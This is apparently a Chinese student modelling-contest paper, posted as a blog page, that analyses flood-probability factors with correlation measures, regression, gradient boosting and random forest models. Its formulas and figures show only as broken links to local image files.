数据服从正态分布&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Anderson-Darling 检验结果: 数据不服从正态分布&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 偏度和峰度</span></span><br><span class=\"line\">skewness = stats.skew(flood_probabilities)</span><br><span class=\"line\">kurtosis = stats.kurtosis(flood_probabilities)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;偏度: <span class=\"subst\">&#123;skewness&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;峰度: <span class=\"subst\">&#123;kurtosis&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">abs</span>(skewness) &lt; <span class=\"number\">0.5</span> <span class=\"keyword\">and</span> <span class=\"built_in\">abs</span>(kurtosis) &lt; <span class=\"number\">3</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;偏度和峰度结果: 数据服从正态分布&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;偏度和峰度结果: 数据不服从正态分布&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示Anderson-Darling检验结果</span></span><br><span class=\"line\">ad_test_results = pd.DataFrame(&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;临界值&#x27;</span>: ad_test.critical_values,</span><br><span class=\"line\">    <span class=\"string\">&#x27;显著性水平(%)&#x27;</span>: ad_test.significance_level</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(ad_test_results)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 绘制洪水概率的折线图</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">10</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\">plt.plot(data[<span class=\"string\">&#x27;id&#x27;</span>], flood_probabilities, marker=<span class=\"string\">&#x27;o&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;洪水概率的折线图&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;ID&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">plt.grid(<span class=\"literal\">True</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"洪水灾害的数据分析与预测基于多模型集成学习的方法研究\"><a class=\"anchor\" href=\"#洪水灾害的数据分析与预测基于多模型集成学习的方法研究\">#</a> 洪水灾害的数据分析与预测：基于多模型集成学习的方法研究</h1>\n<h2 id=\"摘要\"><a class=\"anchor\" href=\"#摘要\">#</a> 摘要</h2>\n<p>本研究围绕洪水灾害的分析与预测展开，利用多模型集成学习方法对洪水发生概率及其影响因素进行了系统性和科学性的探讨。研究通过对附件提供的 train.csv 数据进行预处理，确保数据的准确性和完整性，并基于多种相关性分析和预测模型，提出了有效的洪水预测和防洪减灾策略。</p>\n<p>针对问题一，本文采用<strong>皮尔逊</strong>相关系数和<strong>斯皮尔曼</strong>等级相关系数对 20 个指标与洪水发生概率之间的相关性进行了详细量化分析。结果显示，<strong>基础设施恶化、季风强度、大坝质量、地形排水、河流管理</strong>等指标与洪水发生概率具有显著相关性。基于这些分析，研究提出了一系列合理的防洪措施建议，如加强基础设施建设、优化河流管理、提升大坝质量等，以有效降低洪水发生的风险。</p>\n<p>针对问题二，本文利用<strong> K-means</strong> 聚类方法将洪水发生概率划分为高、中、低三个风险等级，并深入分析了不同风险等级下的<strong>指标特征差异</strong>。通过对高、中、低风险类别中各项影响因素的详细探讨，建立了四个具有高度准确性的预警评价模型，明确了不通类别洪水风险的主要特征，为洪水风险管理提供了科学依据。</p>\n<p>针对问题三，研究基于前述相关性分析结果，分别构建了<strong>多元线性回归模型、梯度提升树模型、决策树模型、随机森林模型和逻辑回归模型</strong>，系统评估了各模型的预测性能。为了提高预测的准确性和稳定性，本文通过 Bagging 技术整合多种模型的预测结果，提出了一个集成学习模型。该模型在对 test.csv 数据进行验证时，显示出优异的预测性能，进一步提升了洪水发生概率预测的准确性。</p>\n<p>针对问题四，本文利用集成学习模型对 test.csv 中的数据进行了洪水发生概率的预测，并将预测结果填入 submit.csv 中。通过绘制直方图和折线图，对预测结果的分布进行了统计分析，并通过<strong> Quantile-Quantile 图、Shapiro-Wilk 检验、Kolmogorov-Smirnov 测试和 Anderson-Darling 检验</strong>，验证了预测结果的分布特性。结果表明，模型预测的洪水发生概率分布较为合理，但不完全符合正态分布，具有一定的重尾现象，进一步验证了模型的有效性和可靠性。</p>\n<p>总体而言，本研究不仅为洪水灾害的预测提供了有效的数学模型和工具，也为制定科学合理的防洪减灾策略提供了重要参考和借鉴。通过对数据的深入分析和模型的多样化应用，本文为相关领域的研究和实践提供了新的思路和方法。本文的研究成果不仅具有重要的理论价值，也在实际应用中具有广泛的推广潜力。</p>\n<p><em><strong>* 关键词 *</strong></em>：洪水灾害，数据分析，多模型集成学习，皮尔逊相关系数，斯皮尔曼等级相关系数，K-means 聚类，风险分类，Bagging 技术，预警评价模型，正态分布分析，防洪减灾措施</p>\n<h2 id=\"目录\"><a class=\"anchor\" href=\"#目录\">#</a> 目录</h2>\n<p><a href=\"#_Toc28221\"><em><strong>* 洪水灾害的数据分析与预测：基于多模型集成学习的方法研究 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc26087\"><em><strong>* 一、问题背景与问题重述 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc20599\">1.1 问题背景\t</a></p>\n<p><a href=\"#_Toc12872\">1.2 已知条件\t</a></p>\n<p><a href=\"#_Toc9667\">1.3 问题重述\t</a></p>\n<p><a href=\"#_Toc18489\"><em><strong>* 二、 模型假设 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc21271\"><em><strong>* 三、 符号说明 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc24812\"><em><strong>* 四、 研究思路 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc23690\"><em><strong>* 五、*</strong></em> <em><strong>* 问题一的建模与求解 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc10510\">5.1 数据预处理\t</a></p>\n<p><a href=\"#_Toc14684\">5.2 问题一的模型建立与求解\t</a></p>\n<p><a href=\"#_Toc19215\">5.2.1 用皮尔逊相关系数和斯皮尔曼等级相关系数研究各指标与洪水发生概率的相关性。\t</a></p>\n<p><a href=\"#_Toc8589\">5.2.2 通过多元线性回归、递归提升树、随机森林对指标的优劣进行分析。\t</a></p>\n<p><a href=\"#_Toc16643\">5.2.3 结果分析\t</a></p>\n<p><a href=\"#_Toc26819\">5.3 建议与措施\t</a></p>\n<p><a href=\"#_Toc21065\"><em><strong>* 六、问题二的建模与求解 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc22996\">6.1 问题 2 的分析\t</a></p>\n<p><a href=\"#_Toc913\">6.1.1 数据预处理\t</a></p>\n<p><a href=\"#_Toc24367\">6.1.2 聚类方法选择\t</a></p>\n<p><a href=\"#_Toc13314\">6.2  k-means 建模实现与分析\t</a></p>\n<p><a href=\"#_Toc26613\">6.2.1 模型建立\t</a></p>\n<p><a href=\"#_Toc14469\">6.2.2 高中低风险特征分析\t</a></p>\n<p><a href=\"#_Toc13962\">6.2.3 建立发生洪水不同风险预警模型\t</a></p>\n<p><a href=\"#_Toc3720\">6.3 模型灵敏度分析\t</a></p>\n<p><a href=\"#_Toc27867\">6.3.1 基于特征变化率的灵敏度计算\t</a></p>\n<p><a href=\"#_Toc18865\">6.3.2 基于预测结果熵值的灵敏度计算\t</a></p>\n<p><a href=\"#_Toc2991\">七、 问题三的建模与求解\t</a></p>\n<p><a href=\"#_Toc15454\">7.1 指标选取\t</a></p>\n<p><a href=\"#_Toc1478\">7.1.2 基于过滤法选取关键指标\t</a></p>\n<p><a href=\"#_Toc6370\">7.2 各模型结果分析\t</a></p>\n<p><a href=\"#_Toc19592\">7.3 最终模型建立\t</a></p>\n<p><a href=\"#_Toc31192\"><em><strong>* 八、问题四的建模与求解 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc11155\">8.1 结果预测\t</a></p>\n<p><a href=\"#_Toc29202\">8.2 结果可视化\t</a></p>\n<p><a href=\"#_Toc12659\">8.3 判断洪水发生概率是否符合正态分布  </a></p>\n<p><a href=\"#_Toc2276\">8.3.2 Shapiro-Wilk 检验\t</a></p>\n<p><a href=\"#_Toc5950\">8.3.3 Kolmogorov-Smirnov 测试\t</a></p>\n<p><a href=\"#_Toc28126\">8.3.4 Anderson-Darling 检验\t</a></p>\n<p><a href=\"#_Toc26091\"><em><strong>* 九、*</strong></em><em><strong>* 模型分析 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc18219\">9.1  模型的优点\t</a></p>\n<p><a href=\"#_Toc20389\">9.2 模型的缺点\t</a></p>\n<p><a href=\"#_Toc22586\">9.3 模型的推广\t</a></p>\n<p><a href=\"#_Toc9316\"><em><strong>* 十、*</strong></em><em><strong>* 总结 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc27225\"><em><strong>* 十一、*</strong></em><em><strong>* 参考文献 *</strong></em>\t</a></p>\n<p><a href=\"#_Toc17550\"><em><strong>* 十二、*</strong></em><em><strong>* 附录 *</strong></em>\t</a></p>\n<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n<h1 id=\"-2\"><a class=\"anchor\" href=\"#-2\">#</a> </h1>\n<p>**<br />\n**</p>\n<h1 id=\"一-问题背景与问题重述\"><a class=\"anchor\" href=\"#一-问题背景与问题重述\">#</a> <em><strong>* 一、问题背景与问题重述 *</strong></em></h1>\n<h2 id=\"11-问题背景\"><a class=\"anchor\" href=\"#11-问题背景\">#</a> <em><strong>*1.1 问题背景 *</strong></em></h2>\n<p>洪水作为一种由暴雨、急剧融冰化雪、风暴潮等自然因素引发的自然灾害，对全球范围内的社会经济系统构成了重大威胁。从先秦时期《尚书・尧典》到现代全球频发的洪水事件，无不彰显着洪水灾害的广泛性与严重性。进入 21 世纪以后，随气候环境的严重变化和人类活动加剧，洪水灾害的频率和强度显著提高，对人类社会造成了前所未有的挑战，本论文基于此，以附件里的数据为参考，对于洪水发生概率及其影响因素进行了深入的分析。</p>\n<h2 id=\"12-已知条件\"><a class=\"anchor\" href=\"#12-已知条件\">#</a> <em><strong>*1.2 已知条件 *</strong></em></h2>\n<p>​\t为了研究与洪水发生概率有关的各个指标，本题提供了 train.csv、test.csv、submit.csv 三个附件为研究依据。</p>\n<p>1.1048574 个包含洪水事件 id、季风强度、地形排水、河流管理、森林砍伐、城市化、气候变化、大坝质量、淤积、农业实践、侵蚀、无效防灾、排水系统、海岸脆弱性、滑坡、流域、基础设施恶化、人口得分、湿地损失、规划不足、政策因素和发生洪水的概率的事件训练表格。（train.csv）</p>\n<p>2.745305 个包含洪水事件 id 和上述 20 个指标得分，缺少洪水概率的测试表格。(test.csv)</p>\n<p>3. 包含 test.csv 的洪水事件 id，缺少洪水概率的事件提交表格。(submit.csv)</p>\n<p>为了更好的对洪水预防提供建议，本小组选取以下文章作为参考文献：</p>\n<pre><code> 1.选取对于河流管理因素治理的参考[1]\n\n 2.选取对于水利工程等基础设施因素治理的参考[2][3]\n\n 3.选取对于气候变化因素治理的参考[4][5]\n\n 4.选取对于降水预测治理的参考[6]\n</code></pre>\n<h2 id=\"13-问题重述\"><a class=\"anchor\" href=\"#13-问题重述\">#</a> <em><strong>*1.3 问题重述 *</strong></em></h2>\n<p>​\t问题 1 通过分析 train.csv 中的数据，分析并可视化上述 20 个指标与洪水发生的关联的强弱性。并根据可能的原因针对洪水预防提出建议和措施。</p>\n<p>​\t问题 2 将附件 train.csv 中洪水发生的概率聚类成不同的类别，分析具有高中低风险的洪水事件的指标特征。</p>\n<p>​\t问题 3 基于问题 1 中的指标分析结果建立洪水事件发生的概率预测模型。从 20 个指标中选取合适指标，预测洪水发生的概率，并验证模型准确性。并且尝试分析如果只用五个指标应该如何改进模型。</p>\n<p>​\t问题 4 基于问题 3 建立的洪水发生概率预测模型，预测 test.csv 中事件发生洪水概率并填入 submit.csv 中，并绘制发生洪水概率的直方图和折线图，分析结果是否呈现正态分布。</p>\n<h1 id=\"二-模型假设\"><a class=\"anchor\" href=\"#二-模型假设\">#</a> <strong>二、</strong> <em><strong>* 模型假设 *</strong></em></h1>\n<p>\\1. 假设题目所给的数据真实可靠；</p>\n<p>\\2. 假设洪水事件由且仅由这 20 个指标影响；</p>\n<p>\\3. 假设洪水发生概率与其他事件呈线性关系。</p>\n<h1 id=\"三-符号说明\"><a class=\"anchor\" href=\"#三-符号说明\">#</a> <strong>三、</strong> <em><strong>* 符号说明 *</strong></em></h1>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps78.jpg)</td>\n<td>洪水发生概率</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps79.jpg)</td>\n<td>均方误差</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps80.jpg)</td>\n<td>余弦相似度</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps81.jpg)</td>\n<td>第！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps82.jpg) 个样本的真实值</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps83.jpg)</td>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps84.jpg) 的平均值</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps85.jpg)</td>\n<td>模型对第！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps86.jpg) 个样本的预测值</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps87.jpg)</td>\n<td>第！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps88.jpg) 个指标，以 csv 出现的先后排序</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps89.jpg)</td>\n<td>第！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps90.jpg) 个指标的系数</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps91.jpg)</td>\n<td>皮尔逊相关系数</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps92.jpg)</td>\n<td>斯皮尔曼等级相关系数</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps93.jpg)</td>\n<td>第 �� 个数据点的两个变量的等级差值</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps94.jpg)</td>\n<td>聚类中心</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps95.jpg)</td>\n<td>分配给聚类中心！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps96.jpg) 的数据点的集合</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps97.jpg)</td>\n<td>数据点！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps98.jpg) 与聚类中心！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps99.jpg) 的距离</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps100.jpg)</td>\n<td>统计量</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps101.jpg)</td>\n<td>权重系数</td>\n</tr>\n<tr>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps102.jpg)</td>\n<td>第！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps103.jpg) 个排序后的样本数据点</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"四-研究思路\"><a class=\"anchor\" href=\"#四-研究思路\">#</a> <strong>四、</strong> <em><strong>* 研究思路 *</strong></em></h1>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps104.jpg)</p>\n<h1 id=\"五-问题一的建模与求解\"><a class=\"anchor\" href=\"#五-问题一的建模与求解\">#</a> <strong>五、</strong> <em><strong>* 问题一的建模与求解 *</strong></em></h1>\n<p>在分析该题目的时候，本文首先使用相关系数判定各数据的相关性，然后使用多元回归算法建立这 20 个指标关于洪水概率的数学模型，最后使用梯度提升树、随机森林回归模型预测洪水发生的概率，并进行了 K 折交叉验证、模型评估、特征重要性分析以及损失曲线的绘制。</p>\n<h2 id=\"51-数据预处理\"><a class=\"anchor\" href=\"#51-数据预处理\">#</a> <em><strong>*5.1 数据预处理 *</strong></em></h2>\n<p>（1）针对给出的超过 100 万条的洪水事件数据，本文对 train.csv 进行基本的数据清洗，处理缺失值、异常值。</p>\n<p>（2）由于 id 列对于数据分析无直接用处，本文对该列进行清洗处理。</p>\n<h2 id=\"52-问题一的模型建立与求解\"><a class=\"anchor\" href=\"#52-问题一的模型建立与求解\">#</a> <em><strong>*5.2 问题一的模型建立与求解 *</strong></em></h2>\n<h3 id=\"521用皮尔逊相关系数和斯皮尔曼等级相关系数研究各指标与洪水发生概率的相关性\"><a class=\"anchor\" href=\"#521用皮尔逊相关系数和斯皮尔曼等级相关系数研究各指标与洪水发生概率的相关性\">#</a> <em><strong>*5.2.*</strong></em><em><strong>*1 用皮尔逊相关系数和斯皮尔曼等级相关系数研究各指标与洪水发生概率的相关性。*</strong></em></h3>\n<p>​\t首先，我们根据式一计算各个指标对于洪水概率的皮尔逊相关系数：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps105.jpg)      （1）</p>\n<p>​\t斯皮尔曼等级相关系数和！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps106.jpg) 的计算公式如式二三所示：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps107.jpg)          （2）</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps108.jpg)         （3）</p>\n<p>本文使用.core () 函数，通过皮尔逊相关系数公式和斯皮尔曼等级相关系数来对各个指标和洪水概率的相关系数进行计算，最终得到相关系数表格一：</p>\n<p>表 1 相关系数前 10 的指标</p>\n<table>\n<thead>\n<tr>\n<th>指标</th>\n<th>皮尔逊相关系数</th>\n<th>斯皮尔曼等级相关系数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>基础设施恶化</td>\n<td>0.190152</td>\n<td>0.1813993896616919</td>\n</tr>\n<tr>\n<td>季风强度</td>\n<td>0.189259</td>\n<td>0.18027659009022504</td>\n</tr>\n<tr>\n<td>大坝质量</td>\n<td>0.187676</td>\n<td>0.17945801481789098</td>\n</tr>\n<tr>\n<td>地形排水</td>\n<td>0.187643</td>\n<td>0.18048274098179304</td>\n</tr>\n<tr>\n<td>河流管理</td>\n<td>0.187202</td>\n<td>0.1789312726571455</td>\n</tr>\n<tr>\n<td>淤积</td>\n<td>0.186914</td>\n<td>0.17873822145951626</td>\n</tr>\n<tr>\n<td>人口得分</td>\n<td>0.186285</td>\n<td>0.1779930987957486</td>\n</tr>\n<tr>\n<td>气候变化</td>\n<td>0.185311</td>\n<td>0.17711933159486049</td>\n</tr>\n<tr>\n<td>滑坡</td>\n<td>0.184926</td>\n<td>0.17663628560684871</td>\n</tr>\n<tr>\n<td>森林砍伐</td>\n<td>0.184420</td>\n<td>0.1770136418593642</td>\n</tr>\n</tbody>\n</table>\n<p>最终可视化图片为：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps109.jpg)![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps110.jpg)</p>\n<p>图 1 不同因素对洪水概率的影响  图 2 不同因素与洪水概率的斯皮尔曼相关系数</p>\n<p>为了便于分析相关性差异，我们将皮尔逊相关系数减去 0.175、斯皮尔曼等级相关系数减去 0.17 后再次可视化，得到结果为：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps111.jpg)![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps112.jpg)</p>\n<p>图 3 调整后的相关系数柱状图</p>\n<h3 id=\"522通过多元线性回归-递归提升树-随机森林对指标的优劣进行分析\"><a class=\"anchor\" href=\"#522通过多元线性回归-递归提升树-随机森林对指标的优劣进行分析\">#</a> <em><strong>*5.2.*</strong></em><em><strong>*2 通过多元线性回归、递归提升树、随机森林对指标的优劣进行分析。*</strong></em></h3>\n<p>先在模型一中，通过多元线性回归拟合模型里各指标的系数，通过计算预测值！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps113.jpg) 和真实值！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps114.jpg) 之间的均方误差！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps115.jpg)、在测试集的分数！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps116.jpg) 以及余弦相似度用以评估模型性能，表达式如下：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps117.jpg)          (4)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps118.jpg)           (5)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps119.jpg)         (6)</p>\n<h4 id=\"5221-线性回归模型\"><a class=\"anchor\" href=\"#5221-线性回归模型\">#</a> <em><strong>*5.2.*</strong></em><em><strong>*2.1 线性回归模型 *</strong></em></h4>\n<p>多元线性回归模型是一种常用的统计分析方法，该模型表达式为：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps120.jpg)    (7)</p>\n<p>​\t首先初始化回归系数，然后使用梯度下降或正规方程法来迭代更新回归系数，最小化损失函数（均方误差），训练完成后，输出不同特征的回归系数，这些系数反映了每个特征对预测目标的影响程度。</p>\n<p>使用训练数据（X_train 和 y_train）训练线性回归模型，并使用模型对测试集 X_test 进行预测，返回预测值 y_pred，并且得到性能指标如下：</p>\n<p>表 2 线性回归模型性能指标</p>\n<table>\n<thead>\n<tr>\n<th>性能指标</th>\n<th>数值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>测试集分数</td>\n<td>0.8444528508563269</td>\n</tr>\n<tr>\n<td>均方误差</td>\n<td>0.0004043169737229802</td>\n</tr>\n<tr>\n<td>余弦相似度</td>\n<td>0.9992129608069907</td>\n</tr>\n<tr>\n<td>截距</td>\n<td>-0.053357024379501294</td>\n</tr>\n</tbody>\n</table>\n<p>最终得到公式：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps121.jpg)(8)</p>\n<h4 id=\"5222-梯度提升树模型\"><a class=\"anchor\" href=\"#5222-梯度提升树模型\">#</a> <em><strong>*5.2.*</strong></em><em><strong>*2.2 梯度提升树模型 *</strong></em></h4>\n<p>本文使用梯度提升树（Gradient Boosting Trees, GBT）模型来预测洪水发生概率，并通过一系列步骤来评估模型的性能、特征重要性以及训练过程中的损失变化。该模型通过组合多个弱学习器（决策树）形成一个强学习器，算法通过递归逐步提升优化模型的预测能力，在每一轮迭代中，计算当前模型的残差并基于该残差训练新的决策树，而新训练的决策树会被加入到模型中，与之前的模型加权融合以提高预测能力。</p>\n<p>本文设置迭代次数为 500，即构建 500 棵决策树拟合数据。并使用 5 折交叉验证帮助评估模型在不同数据子集上的性能，估计模型泛化能力，其输出的每折交叉评分为 R2 的值。本文使用完整的训练集（X_train 和 y_train）训练梯度提升树模型，并在测试集上评估模型性能。同时输出特征重要性并使用 matplotlib 库绘制特征重要性的条形图，以直观地展示哪些特征对模型预测的贡献最大。</p>\n<p>本文使用 staged_predict 方法获取模型训练集和测试集上每轮迭代后的预测结果，计算并存储每轮迭代后的均方误差（MSE），以观察训练集和测试集上损失值的变化情况，进而使用 matplotlib 库绘制训练集和测试集上的损失值（MSE）随迭代次数变化的曲线，帮助观察模型是否过拟合（即训练集上的损失持续下降，而测试集上的损失在某个点后开始上升）。</p>\n<p>以下为该模型的性能指标：</p>\n<p>表 3 梯度提升树模型性能指标</p>\n<table>\n<thead>\n<tr>\n<th>性能指标</th>\n<th>数值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>测试集分数</td>\n<td>0.8367668430250391</td>\n</tr>\n<tr>\n<td>交叉验证平均值</td>\n<td>0.8375024016574082</td>\n</tr>\n<tr>\n<td>均方误差</td>\n<td>0.00042429537540674935</td>\n</tr>\n<tr>\n<td>余弦相似度</td>\n<td>0.9991741505605559</td>\n</tr>\n</tbody>\n</table>\n<p>最终可视化结果如下图：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps122.jpg)</p>\n<p>图 4 梯度提升树各指标的重要性</p>\n<h4 id=\"5223-随机森林模型\"><a class=\"anchor\" href=\"#5223-随机森林模型\">#</a> <em><strong>*5.2.*</strong></em><em><strong>*2.3 随机森林模型 *</strong></em></h4>\n<p>随机森林模型是多个决策树的集成，通过对每棵树的预测结果进行投票或加权平均来得到最终的预测结果。随机森林通过随机选择样本和特征来构建每棵树，从而增加模型的鲁棒性和泛化能力。整个过程线通过自助法（Bootstrap）从训练数据中有放回地抽样，生成多个不同的子集，然后对每个子集，随机选择部分特征，训练一棵决策树，最后将所有树的预测结果进行投票（分类问题）或加权平均（回归问题），得到最终的预测结果，从而输出不同指标的权重（特征重要性），表示每个特征在所有树中的分割点选择过程中所贡献的纯净度提升的总和。</p>\n<p>本文设置随机森林的决策树数量为 200，通过抽取部分训练数据训练模型并使用投票策略以加快模型训练速度并提高模型精度。该模型的性能指标如表 4 所示：</p>\n<p>表 4 随机森林模型性能指标</p>\n<table>\n<thead>\n<tr>\n<th>性能指标</th>\n<th>数值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>测试集分数</td>\n<td>0.6559609909975268</td>\n</tr>\n<tr>\n<td>预测准确率</td>\n<td>0.000894267826368524</td>\n</tr>\n<tr>\n<td>均方误差</td>\n<td>0.000894267826368524</td>\n</tr>\n<tr>\n<td>余弦相似度</td>\n<td>0.9982658517029762</td>\n</tr>\n</tbody>\n</table>\n<p>随机森林得到的特征重要性如下图：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps123.jpg)</p>\n<p>图 5 随机森林各指标的重要性</p>\n<h3 id=\"523-结果分析\"><a class=\"anchor\" href=\"#523-结果分析\">#</a> <em><strong>*5.2.3*</strong></em> <em><strong>* 结果分析 *</strong></em></h3>\n<p>根据皮尔逊相关系数和斯皮尔曼等级相关系数结果分析，可以发现 **** 基础设施恶化、季风强度、地形排水 *<em><strong> 三个指标与洪水发生概率的相关性最强，而</strong></em> * 海岸脆弱性、排水系统、侵蚀 **** 三个指标与洪水发生概率的相关性最弱。</p>\n<p>针对指标优劣性的分析，本文采用了线性回归模型、递归提升树回归模型和随机森林模型。本文对三种模型得出的指标系数进行降序排列，并记前十项指标得分为 1，后十项指标得分为 - 1，将三种模型的指标得分进行累加，通过比较各指标得分情况判断指标的重要性。最终得到各指标得分条形图。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps124.jpg)</p>\n<p>图 6 各指标得分条形图</p>\n<p>由图可以发现，经过三个模型的综合分析，<strong>森林砍伐</strong>与洪水发生概率的相关性最强，而<strong>淤积、滑坡、城市化、海岸脆弱性、气候变化、侵蚀、人口得分、大坝质量、河流管理、地形排水</strong>十个指标与洪水发生概率的相关性较强，<strong>农业实践、排水系统、规划不足、季风强度、政策因素、流域、基础设施恶化</strong>七个指标与洪水发生概率的相关性较弱 **，湿地损失、无效防灾 ** 两个指标与洪水发生概率的相关性最弱。</p>\n<p>尽管三个模型得出的指标相关性排序结果各有差异，但观察数据可以发现各指标重要性数值差异并不大，因此在考虑洪水发生概率及应对洪水灾害时，<em><strong>* 以上 20 个指标都需要考虑 *</strong></em>。</p>\n<p>综上，本文认为 **** 森林砍伐、淤积、气候变化、人口得分、大坝质量、河流管理、地形排水 *<em><strong> 